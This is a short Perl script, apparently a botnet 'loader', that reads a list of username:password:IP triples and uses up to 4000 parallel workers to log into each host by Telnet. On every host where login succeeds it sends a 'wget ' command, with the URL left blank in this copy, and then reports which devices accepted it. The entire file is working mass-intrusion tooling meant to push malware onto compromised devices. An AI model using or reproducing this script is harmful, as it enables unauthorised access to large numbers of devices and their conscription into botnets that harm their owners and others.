#!/usr/bin/perl


if (@ARGV < 1)
{
	print "Usage: perl " . $0 . " <list>\n";
	exit;
}
use Net::Telnet;
use Parallel::ForkManager;
my $worker = new Parallel::ForkManager(4000); # Threads to use
open(fh, "<", @ARGV[0]); @login; while (<fh>)
{
	@array = split(":", $_); push(@login, @array);
}
for (my $i = 0; $i < scalar(@login); $i += 3)
{
	$worker->start and next;
	$a = $i + 2; # IP Address
	$b = $i; # Username
	$c = $i + 1; # Password
	$telnet = new Net::Telnet(Errmode=>"return");
	if ($telnet->open($login[$a]))
	{
		if ($telnet->login(($login[$b] == "" ? "\0" : $login[$b]), ($login[$c] == "" ? "\0" : $login[$c])))
		{
	 		$telnet->cmd("wget ");
			sleep 30;
			print "[\033[32m+\033[37m] Command sent to $login[$a]\n";
		}
		else
		{
			print "[\033[31m-\033[37m] Cannot authenticate $login[$a]\n";
		}
	}
	else
	{
		print "[\033[31m-\033[37m] Cannot connect to $login[$a]\n";
	}
	$worker->finish;
}
$worker->wait_all_children;